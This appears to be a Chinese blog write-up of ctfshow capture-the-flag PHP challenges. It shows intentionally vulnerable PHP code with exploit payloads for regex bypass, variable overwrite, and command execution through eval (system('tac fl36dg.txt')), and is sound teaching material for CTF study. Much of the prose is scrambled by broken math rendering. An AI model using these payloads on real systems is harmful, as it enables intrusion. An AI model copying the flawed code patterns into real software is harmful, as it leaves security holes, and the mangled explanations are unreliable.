{"blogid": "122964668", "writerAge": "码龄1年", "writerBlogNum": "399", "writerCollect": "1909", "writerComment": "292", "writerFan": "4174", "writerGrade": "6级", "writerIntegral": "5796", "writerName": "IT老涵", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_122964668.jpg", "writerRankTotal": "16301", "writerRankWeekly": "15681", "writerThumb": "654", "writerVisitNum": "449547", "blog_read_count": "1263", "blog_time": "于 2022-02-16 15:32:00 发布", "blog_title": "CTF中PHP相关题目考点总结（二）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p><img alt=\"image.png\" src=\"..\\..\\static\\image\\8cbb9af0ab5373faa132f6c11c539c4c.png\"/></p>\n<h2><a id=\"_2\"></a>介绍</h2>\n<p>本篇文章主要总结了我在写ctfshow题目中遇到的关于PHP的考点。因为只总结知识点和考点会比较空洞，也不容易理解，所以我都是通过题目来总结考点，这样的话比较容易理解。</p>\n<h2><a id=\"PHP_6\"></a>PHP特性相关考点</h2>\n<h2><a id=\"_8\"></a>一、</h2>\n<p>考点：php正则表达式的匹配模式差异。</p>\n<p><strong>例题：</strong></p>\n<pre><code>show_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){           #/i表示不区分大小写，/m表示多行匹配\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n}\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true，否则返回false<br/> /m 多行匹配模式下，若存在换行\\n并且有开始^或结束<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        符\n       \n       \n        的\n       \n       \n        情\n       \n       \n        况\n       \n       \n        下\n       \n       \n        ，\n       \n       \n        将\n       \n       \n        以\n       \n       \n        换\n       \n       \n        行\n       \n       \n        为\n       \n       \n        分\n       \n       \n        隔\n       \n       \n        符\n       \n       \n        ，\n       \n       \n        逐\n       \n       \n        行\n       \n       \n        进\n       \n       \n        行\n       \n       \n        匹\n       \n       \n        配\n       \n       \n        。\n       \n       \n        因\n       \n       \n        此\n       \n       \n        当\n       \n       \n        我\n       \n       \n        们\n       \n       \n        传\n       \n       \n        入\n       \n       \n        以\n       \n       \n        下\n       \n       \n        p\n       \n       \n        a\n       \n       \n        y\n       \n       \n        l\n       \n       \n        o\n       \n       \n        a\n       \n       \n        d\n       \n       \n        时\n       \n       \n        ，\n       \n       \n        第\n       \n       \n        一\n       \n       \n        个\n       \n       \n        i\n       \n       \n        f\n       \n       \n        正\n       \n       \n        则\n       \n       \n        匹\n       \n       \n        配\n       \n       \n        会\n       \n       \n        返\n       \n       \n        回\n       \n       \n        t\n       \n       \n        r\n       \n       \n        u\n       \n       \n        e\n       \n       \n        。\n       \n       \n        但\n       \n       \n        是\n       \n       \n        当\n       \n       \n        不\n       \n       \n        是\n       \n       \n        多\n       \n       \n        行\n       \n       \n        匹\n       \n       \n        配\n       \n       \n        模\n       \n       \n        式\n       \n       \n        的\n       \n       \n        时\n       \n       \n        候\n       \n       \n        也\n       \n       \n        就\n       \n       \n        是\n       \n       \n        在\n       \n       \n        第\n       \n       \n        二\n       \n       \n        个\n       \n       \n        i\n       \n       \n        f\n       \n       \n        正\n       \n       \n        则\n       \n       \n        匹\n       \n       \n        配\n       \n       \n        中\n       \n       \n        出\n       \n       \n        现\n       \n       \n        换\n       \n       \n        行\n       \n       \n        符\n       \n       \n        ‘\n       \n      \n      \n       符的情况下，将以换行为分隔符，逐行进行匹配。因此当我们传入以下payload时，第一个if正则匹配会返回true。但是当不是多行匹配模式的时候也就是在第二个if正则匹配中出现换行符`%0a`的时，\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.88888em; vertical-align: -0.19444em;\"></span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">情</span><span class=\"mord cjk_fallback\">况</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">将</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">换</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">分</span><span class=\"mord cjk_fallback\">隔</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">逐</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">进</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">匹</span><span class=\"mord cjk_fallback\">配</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">因</span><span class=\"mord cjk_fallback\">此</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">第</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord cjk_fallback\">正</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">匹</span><span class=\"mord cjk_fallback\">配</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">返</span><span class=\"mord cjk_fallback\">回</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">e</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">但</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">多</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">匹</span><span class=\"mord cjk_fallback\">配</span><span class=\"mord cjk_fallback\">模</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span><span class=\"mord cjk_fallback\">也</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord cjk_fallback\">第</span><span class=\"mord cjk_fallback\">二</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord cjk_fallback\">正</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">匹</span><span class=\"mord cjk_fallback\">配</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord cjk_fallback\">现</span><span class=\"mord cjk_fallback\">换</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord\">‘</span></span></span></span></span>cmd的值会被当做两行处理，因此当我们传入以下payload时，第二个if正则表达式匹配到的是aaaphp，不符合以php开头和以php结尾会返回false，从而echo出flag。</p>\n<p>payload如下：</p>\n<pre><code>?cmd=aaa%0aphp            #%0a为换行符\n</code></pre>\n<blockquote>\n<p><a href=\"https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVExrc2JqUU1DWWd5\"><strong>【相关技术文档】</strong></a></p>\n</blockquote>\n<h2><a id=\"_44\"></a>二、</h2>\n<p>考点：php变量覆盖。</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='你还想要flag嘛？';\n$suces='既然你想要那给你吧！';\nforeach($_GET as $key =&gt; $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key =&gt; $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces);\n?&gt;\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>这里利用的是变量覆盖，关键点在</p>\n<p>key=key=</p>\n<p>value，这里把$key的值当作了变量。</p>\n<pre><code>例如 $key=flag  则$$key=$flag\n</code></pre>\n<p>这里一共有三个变量，<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        e\n       \n       \n        r\n       \n       \n        r\n       \n       \n        o\n       \n       \n        r\n       \n       \n        、\n       \n      \n      \n       error、\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord cjk_fallback\">、</span></span></span></span></span>suces和<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        ；\n       \n       \n        这\n       \n       \n        里\n       \n       \n        通\n       \n       \n        过\n       \n       \n        d\n       \n       \n        i\n       \n       \n        e\n       \n       \n        (\n       \n      \n      \n       flag；这里通过die(\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">；</span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">里</span><span class=\"mord cjk_fallback\">通</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mopen\">(</span></span></span></span></span>error)或者die($suces)都可以输出flag，所以有两个payload。</p>\n<p><strong>第一种：</strong><br/> 通过die(<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        e\n       \n       \n        r\n       \n       \n        r\n       \n       \n        o\n       \n       \n        r\n       \n       \n        )\n       \n       \n        输\n       \n       \n        出\n       \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        ，\n       \n       \n        首\n       \n       \n        先\n       \n       \n        我\n       \n       \n        们\n       \n       \n        把\n       \n      \n      \n       error)输出flag，首先我们把\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">输</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">首</span><span class=\"mord cjk_fallback\">先</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">把</span></span></span></span></span>flag的值传给<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        t\n       \n       \n        e\n       \n       \n        s\n       \n       \n        t\n       \n       \n        ，\n       \n       \n        接\n       \n       \n        着\n       \n       \n        再\n       \n       \n        把\n       \n      \n      \n       test，接着再把\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.61508em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">着</span><span class=\"mord cjk_fallback\">再</span><span class=\"mord cjk_fallback\">把</span></span></span></span></span>test的值传给<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        e\n       \n       \n        r\n       \n       \n        r\n       \n       \n        o\n       \n       \n        r\n       \n       \n        ，\n       \n       \n        于\n       \n       \n        是\n       \n      \n      \n       error，于是\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord cjk_fallback\">是</span></span></span></span></span>error的值就是flag，再通过if判断die输出就是flag。<br/> 例如<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        =\n       \n       \n        c\n       \n       \n        t\n       \n       \n        f\n       \n       \n        s\n       \n       \n        h\n       \n       \n        o\n       \n       \n        w\n       \n       \n        \n         x\n        \n        \n         x\n        \n        \n         x\n        \n        \n         x\n        \n        \n         x\n        \n       \n       \n        ，\n       \n       \n        ?\n       \n       \n        t\n       \n       \n        e\n       \n       \n        s\n       \n       \n        t\n       \n       \n        =\n       \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        ，\n       \n       \n        通\n       \n       \n        过\n       \n       \n        第\n       \n       \n        一\n       \n       \n        个\n       \n       \n        f\n       \n       \n        o\n       \n       \n        r\n       \n       \n        循\n       \n       \n        环\n       \n       \n        ，\n       \n       \n        也\n       \n       \n        就\n       \n       \n        是\n       \n      \n      \n       flag=ctfshow{xxxxx}，?test=flag，通过第一个for循环，也就是\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.88888em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.88888em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02691em;\">w</span><span class=\"mord\"><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">x</span></span><span class=\"mord cjk_fallback\">，</span><span class=\"mclose\">?</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.88888em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">通</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">第</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord cjk_fallback\">循</span><span class=\"mord cjk_fallback\">环</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">也</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">是</span></span></span></span></span>test=<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        ，\n       \n       \n        从\n       \n       \n        而\n       \n       \n        把\n       \n       \n        变\n       \n       \n        量\n       \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        的\n       \n       \n        值\n       \n       \n        赋\n       \n       \n        给\n       \n       \n        t\n       \n       \n        e\n       \n       \n        s\n       \n       \n        t\n       \n       \n        变\n       \n       \n        量\n       \n       \n        ，\n       \n       \n        因\n       \n       \n        此\n       \n      \n      \n       flag，从而把变量flag的值赋给test变量，因此\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.88888em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">把</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">赋</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">因</span><span class=\"mord cjk_fallback\">此</span></span></span></span></span>test=ctfshow{xxxxx}，接着再通过第二个for循环，<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        e\n       \n       \n        r\n       \n       \n        r\n       \n       \n        o\n       \n       \n        r\n       \n       \n        =\n       \n      \n      \n       error=\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span></span></span></span></span>test，此时$error=ctfshow{xxxxx} paylload如下：</p>\n<pre><code>?test=flag\n\npost:\nerror=test\n</code></pre>\n<p><strong>第二种：</strong><br/> 通过die(<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        s\n       \n       \n        u\n       \n       \n        c\n       \n       \n        e\n       \n       \n        s\n       \n       \n        )\n       \n       \n        输\n       \n       \n        出\n       \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        ，\n       \n       \n        首\n       \n       \n        先\n       \n       \n        我\n       \n       \n        们\n       \n       \n        把\n       \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        的\n       \n       \n        值\n       \n       \n        传\n       \n       \n        给\n       \n       \n        s\n       \n       \n        u\n       \n       \n        c\n       \n       \n        e\n       \n       \n        s\n       \n       \n        变\n       \n       \n        量\n       \n       \n        ，\n       \n       \n        接\n       \n       \n        着\n       \n       \n        再\n       \n       \n        把\n       \n       \n        f\n       \n       \n        l\n       \n       \n        a\n       \n       \n        g\n       \n       \n        的\n       \n       \n        值\n       \n       \n        给\n       \n       \n        置\n       \n       \n        空\n       \n       \n        ，\n       \n       \n        以\n       \n       \n        达\n       \n       \n        到\n       \n       \n        下\n       \n       \n        面\n       \n       \n        i\n       \n       \n        f\n       \n       \n        条\n       \n       \n        件\n       \n       \n        为\n       \n       \n        0\n       \n       \n        不\n       \n       \n        执\n       \n       \n        行\n       \n       \n        死\n       \n       \n        亡\n       \n       \n        函\n       \n       \n        数\n       \n       \n        的\n       \n       \n        目\n       \n       \n        的\n       \n       \n        ，\n       \n       \n        从\n       \n       \n        而\n       \n       \n        往\n       \n       \n        下\n       \n       \n        执\n       \n       \n        行\n       \n       \n        ，\n       \n       \n        d\n       \n       \n        i\n       \n       \n        e\n       \n       \n        (\n       \n      \n      \n       suces)输出flag，首先我们把flag的值传给suces变量，接着再把flag的值给置空，以达到下面if条件为0不执行死亡函数的目的，从而往下执行，die(\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">s</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">输</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">首</span><span class=\"mord cjk_fallback\">先</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">把</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">s</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">着</span><span class=\"mord cjk_fallback\">再</span><span class=\"mord cjk_fallback\">把</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord cjk_fallback\">置</span><span class=\"mord cjk_fallback\">空</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">达</span><span class=\"mord cjk_fallback\">到</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">面</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mord cjk_fallback\">条</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord\">0</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">执</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">死</span><span class=\"mord cjk_fallback\">亡</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">目</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">往</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">执</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mopen\">(</span></span></span></span></span>suces)即可把flag输出，payload如下：</p>\n<pre><code>?suces=flag&amp;flag=\n</code></pre>\n<h3><a id=\"_108\"></a>三、</h3>\n<p>考点：PHP异常处理的利用，<strong>Exception</strong>处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类。</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n}\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>这里传入两个参数，并且都需要有字母，我们用php内置类让v1不进行报错，v2执行我们的命令就好了。</p>\n<blockquote>\n<p><strong>Exception</strong>处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类。</p>\n</blockquote>\n<p>所以payload如下：</p>\n<pre><code>?v1=Exception&amp;v2=system('tac fl36dg.txt')\n</code></pre>\n<h2><a id=\"_140\"></a>四、</h2>\n<p>考点一：PHP变量名由数字字母下划线组成，是没有.的 我从大佬的文章了解到，GET或POST方式传进去的变量名，会自动将空格 + . [转换为_。</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\|/|~|`|!|@|#|%|^|*|-|+|=|{|}|\"|'|,|.|;|?/\", $c)&amp;&amp;$c&lt;=18){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>这道题其中的一个难点是下面这行代码：</p>\n<pre><code>if(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g']))\n</code></pre>\n<p>PHP变量名由数字字母下划线组成，是没有.的 我从大佬的文章了解到，GET或POST方式传进去的变量名，会自动将空格 + . [转换为_。</p>\n<p>有一种特殊情况，GET或POST方式传参时,变量名中的 [ 也会被替换为_,但其后的字符就再进行替换了<br/> 如 CTF[SHOW.COM =&gt; CTF_SHOW.COM 所以payload如下：</p>\n<pre><code>POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag\n</code></pre>\n<p>很明显这个解是非预期的，其实是可以通过正常步骤得到flag的。</p>\n<p>出题人的<strong>预期解</strong></p>\n<pre><code>get: a=1+fl0g=flag_give_me\npost: 